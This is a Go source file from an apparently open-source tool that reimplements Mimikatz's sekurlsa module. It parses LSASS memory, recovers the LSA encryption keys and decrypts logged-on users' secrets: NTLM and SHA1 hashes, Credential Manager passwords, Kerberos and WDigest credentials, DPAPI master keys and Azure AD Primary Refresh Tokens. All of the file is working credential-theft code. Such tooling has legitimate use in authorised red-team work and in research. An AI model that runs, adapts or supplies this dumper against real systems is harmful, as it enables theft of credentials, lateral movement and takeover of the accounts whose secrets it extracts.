package sekurlsa

import (
	"fmt"
	"time"

	"github.com/vincd/savoir/utils"

	"github.com/vincd/savoir/modules/sekurlsa/packages/cloudap"
	"github.com/vincd/savoir/modules/sekurlsa/packages/credman"
	"github.com/vincd/savoir/modules/sekurlsa/packages/crypto"
	"github.com/vincd/savoir/modules/sekurlsa/packages/dpapi"
	"github.com/vincd/savoir/modules/sekurlsa/packages/globals"
	"github.com/vincd/savoir/modules/sekurlsa/packages/kerberos"
	"github.com/vincd/savoir/modules/sekurlsa/packages/msv"
	"github.com/vincd/savoir/modules/sekurlsa/packages/ssp"
	"github.com/vincd/savoir/modules/sekurlsa/packages/tspkg"
	"github.com/vincd/savoir/modules/sekurlsa/packages/wdigest"
)

type LsaSrv struct {
	Reader     utils.MemoryReader
	CryptoKeys crypto.LsaSrvCryptoKeys
}

type LsaSrvEntry struct {
	AuthenticationId  uint64                     `json:"authentication_id"`
	UserName          string                     `json:"username"`
	Domain            string                     `json:"domain"`
	LogonServer       string                     `json:"logon_server"`
	LogonTime         time.Time                  `json:"logon_time"`
	SID               string                     `json:"sid"`
	MSV               []msv.MSVEntry             `json:"msv"`
	CredentialManager []globals.SavoirCredential `json:"credman"`
	Kerberos          *kerberos.KerberosEntry    `json:"kerberos"`
	DPAPI             *dpapi.DpApiEntry          `json:"dpapi"`
	WDigest           *globals.SavoirCredential  `json:"wdigest"`
	CloudAp           *cloudap.CloudApEntry      `json:"cloudap"`
	SSP               []globals.SavoirCredential `json:"ssp"`
	TsPkg             *globals.SavoirCredential  `json:"tspkg"`
}

func (e LsaSrvEntry) String() string {
	s := fmt.Sprintf("Authentication Id : %d (%016x)\n", e.AuthenticationId, e.AuthenticationId)
	s += fmt.Sprintf("User Name         : %s\n", e.UserName)
	s += fmt.Sprintf("Domain            : %s\n", e.Domain)
	s += fmt.Sprintf("Logon Server      : %s\n", e.LogonServer)
	s += fmt.Sprintf("Logon Time        : %s\n", e.LogonTime)
	s += fmt.Sprintf("SID               : %s\n", e.SID)

	if len(e.MSV) > 0 {
		s += fmt.Sprintf("  msv:\n")
		for _, cred := range e.MSV {
			s += fmt.Sprintf("    [%08x] %s\n", cred.AuthenticationPackageId, cred.Primary)
			if cred.Primary == "Primary" {
				s += fmt.Sprintf("    * Username: %s\n", cred.UserName)
				s += fmt.Sprintf("    * Domain  : %s\n", cred.Domain)
			}
			s += fmt.Sprintf("    * NTLM    : %s\n", cred.NTLMHash)
			s += fmt.Sprintf("    * SHA1    : %s\n", cred.SHA1Hash)
			if cred.DPApi != "" && cred.DPApi != "00000000000000000000000000000000" {
				s += fmt.Sprintf("    * DPAPI   : %x\n", cred.DPApi)
			}
			s += "\n"
		}
	}

	if len(e.CredentialManager) > 0 {
		s += fmt.Sprintf("  credman:\n")
		for _, cred := range e.CredentialManager {
			s += fmt.Sprintf("%s\n", cred)
		}
	}

	if e.Kerberos != nil && ((len(e.Kerberos.Credential.Username) > 0) || (len(e.Kerberos.Credential.Domain) > 0)) {
		s += fmt.Sprintf("  kerberos:\n%s\n", e.Kerberos.Credential)
	}

	if e.DPAPI != nil && len(e.DPAPI.MasterKey) > 0 {
		s += fmt.Sprintf("  dpapi:\n")
		s += fmt.Sprintf("    * GUID:       %s\n", e.DPAPI.KeyGuid)
		s += fmt.Sprintf("    * Master Key: %x\n", e.DPAPI.MasterKey)
		s += "\n"
	}

	if e.WDigest != nil && ((len(e.WDigest.Username) > 0) || (len(e.WDigest.Domain) > 0)) {
		s += fmt.Sprintf("  wdigest:\n%s\n", e.WDigest)
	}

	if e.CloudAp != nil && len(e.CloudAp.CacheDir) > 0 {
		s += fmt.Sprintf("  cloudap:\n")
		s += fmt.Sprintf("    * Cache Dir: %s\n", e.CloudAp.CacheDir)
		s += fmt.Sprintf("    * GUID:      %s\n", e.CloudAp.KeyGuid)
		s += fmt.Sprintf("    * PRT:       %s\n", e.CloudAp.Prt)
		s += fmt.Sprintf("    * DPAPI:     %x\n", e.CloudAp.DPApi)
		s += "\n"
	}

	for i, ssp := range e.SSP {
		if len(ssp.Username) > 0 {
			s += fmt.Sprintf("  ssp:\n")
			s += fmt.Sprintf("    [%08x]\n%s\n", i, ssp)
			s += "\n"
		}
	}

	if e.TsPkg != nil {
		s += fmt.Sprintf("  tspkg:\n%s\n", e.TsPkg)
	}

	return s
}

func NewLsaSrv(r utils.MemoryReader) (*LsaSrv, error) {
	cryptoKeys, err := crypto.FindCryptoKeys(r)
	if err != nil {
		return nil, fmt.Errorf("error getting Crypto: %s", err)
	}

	lsasrv := &LsaSrv{
		Reader:     r,
		CryptoKeys: *cryptoKeys,
	}

	return lsasrv, nil
}

func (l *LsaSrv) ListEntries() ([]*LsaSrvEntry, error) {
	logonEntryList, err := msv.GetLogonEntryList(l.Reader)
	if err != nil {
		return nil, fmt.Errorf("Cannot get LogonEntry list: \"%s\".", err)
	}

	lsasrvEntries := make([]*LsaSrvEntry, 0)
	lsasrvEntiersMap := make(map[uint64]*LsaSrvEntry)
	for _, logonEntry := range logonEntryList {
		// CREDMAN
		lsasrvCredManEntries, err := credman.ParseCrendentialMananger(l.Reader, logonEntry.CredentialManager)
		if err != nil {
			return nil, fmt.Errorf("Error getting CredMan: %s", err)
		}

		for i := 0; i < len(lsasrvCredManEntries); i++ {
			password, err := l.CryptoKeys.DecryptAsString(lsasrvCredManEntries[i].PasswordRaw)
			if err != nil {
				return nil, err
			}

			lsasrvCredManEntries[i].Password = password
		}

		// MSV
		lsasrvMSVEntries, err := msv.ParseMSV(l.Reader, logonEntry.Credentials)
		if err != nil {
			return nil, fmt.Errorf("Error getting MSV: %s", err)
		}

		for i := 0; i < len(lsasrvMSVEntries); i++ {
			clearCredentials, err := l.CryptoKeys.Decrypt(lsasrvMSVEntries[i].EncCredentials)
			if err != nil {
				return nil, err
			}

			entry, err := msv.ParseClearCredentials(l.Reader, clearCredentials)
			if err != nil {
				return nil, err
			}

			lsasrvMSVEntries[i].UserName = entry.UserName
			lsasrvMSVEntries[i].Domain = entry.Domain
			lsasrvMSVEntries[i].NTLMHash = entry.NTLMHash
			lsasrvMSVEntries[i].SHA1Hash = entry.SHA1Hash
			lsasrvMSVEntries[i].DPApi = entry.DPApi
		}

		lsasrvEntry := &LsaSrvEntry{
			AuthenticationId:  logonEntry.LocallyUniqueIdentifier,
			UserName:          logonEntry.UserName,
			Domain:            logonEntry.Domain,
			LogonServer:       logonEntry.LogonServer,
			LogonTime:         logonEntry.LogonTime,
			SID:               logonEntry.Sid,
			CredentialManager: lsasrvCredManEntries,
			MSV:               lsasrvMSVEntries,
			SSP:               make([]globals.SavoirCredential, 0),
		}

		lsasrvEntries = append(lsasrvEntries, lsasrvEntry)
		lsasrvEntiersMap[lsasrvEntry.AuthenticationId] = lsasrvEntry
	}

	// TsPkg
	tspkgEntries, err := tspkg.ParseTsPkg(l.Reader)
	if err != nil {
		fmt.Printf("Error getting TsPkg: %s", err)
	} else {
		for _, tspkgEntry := range tspkgEntries {
			l.CryptoKeys.DecryptCredentials(tspkgEntry)

			if e, ok := lsasrvEntiersMap[tspkgEntry.AuthenticationId]; ok {
				e.TsPkg = tspkgEntry
			} else {
				return nil, fmt.Errorf("Cannot find AuthenticationId %d from TsPkg entry.", tspkgEntry.AuthenticationId)
			}
		}
	}

	// Kerberos
	krbEntries, err := kerberos.ParseKerberos(l.Reader)
	if err != nil {
		fmt.Printf("Error getting Kerberos: %s", err)
	} else {
		for _, krbEntry := range krbEntries {
			l.CryptoKeys.DecryptCredentials(krbEntry.Credential)

			if e, ok := lsasrvEntiersMap[krbEntry.Credential.AuthenticationId]; ok {
				e.Kerberos = krbEntry
			} else {
				return nil, fmt.Errorf("Cannot find AuthenticationId %d from Kerberos entry.", krbEntry.Credential.AuthenticationId)
			}
		}
	}

	// DPAPI
	dpapiEntries, err := dpapi.ParseDpAPI(l.Reader)
	if err != nil {
		fmt.Printf("Error getting DpAPI: %s", err)
	} else {
		for _, dpapiEntry := range dpapiEntries {
			masterKey, err := l.CryptoKeys.Decrypt(dpapiEntry.EncKey)
			if err != nil {
				return nil, err
			}

			dpapiEntry.MasterKey = masterKey

			if e, ok := lsasrvEntiersMap[dpapiEntry.AuthenticationId]; ok {
				e.DPAPI = dpapiEntry
			} else {
				return nil, fmt.Errorf("Cannot find AuthenticationId %d from DPAPI entry.", dpapiEntry.AuthenticationId)
			}
		}
	}

	// WDigest
	wdigestEntries, err := wdigest.ParseWDigest(l.Reader)
	if err != nil {
		fmt.Printf("Error getting WDigest: %s", err)
	} else {
		for _, wdigestEntry := range wdigestEntries {
			l.CryptoKeys.DecryptCredentials(wdigestEntry)

			if e, ok := lsasrvEntiersMap[wdigestEntry.AuthenticationId]; ok {
				e.WDigest = wdigestEntry
			} else {
				return nil, fmt.Errorf("Cannot find AuthenticationId %d from WDigest entry.", wdigestEntry.AuthenticationId)
			}
		}
	}

	// CloudAp
	cloudapEntries, err := cloudap.ParseCloudAp(l.Reader)
	if err != nil {
		fmt.Printf("Error getting CloudAp: %s\n", err)
	} else {
		for _, cloudapEntry := range cloudapEntries {
			prt, err := l.CryptoKeys.DecryptAsStringUTF8(cloudapEntry.EncPrt)
			if err != nil {
				return nil, err
			}
			cloudapEntry.Prt = prt

			dpapi, err := l.CryptoKeys.Decrypt(cloudapEntry.EncDPApi)
			if err != nil {
				return nil, err
			}
			cloudapEntry.DPApi = dpapi

			if e, ok := lsasrvEntiersMap[cloudapEntry.AuthenticationId]; ok {
				e.CloudAp = cloudapEntry
			} else {
				return nil, fmt.Errorf("Cannot find AuthenticationId %d from CloudAp entry.", cloudapEntry.AuthenticationId)
			}
		}
	}

	// SSP
	sspEntries, err := ssp.ParseSSP(l.Reader)
	if err != nil {
		fmt.Printf("Error getting SSP: %s\n", err)
	} else {
		for _, sspEntry := range sspEntries {
			l.CryptoKeys.DecryptCredentials(sspEntry)

			if e, ok := lsasrvEntiersMap[sspEntry.AuthenticationId]; ok {
				e.SSP = append(e.SSP, *sspEntry)
			} else {
				return nil, fmt.Errorf("Cannot find AuthenticationId %d from SSP entry.", sspEntry.AuthenticationId)
			}
		}
	}

	return lsasrvEntries, nil
}
